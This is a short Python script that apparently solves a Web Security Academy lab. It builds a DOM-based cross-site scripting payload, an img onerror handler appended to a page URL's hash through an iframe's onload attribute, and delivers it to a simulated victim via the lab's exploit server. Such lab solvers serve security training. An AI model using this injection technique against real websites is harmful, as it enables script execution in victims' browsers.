from web_security_academy.core.logger import logger


def solve_lab(session):
    xss = "<img src=1 onerror=print()>"
    iframe = f"""<iframe src="{session.url}#" onload="this.src+='{xss}'">"""

    server = session.exploit_server()
    headers = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
    server.deliver_exploit_to_victim("/exploit", headers, iframe)
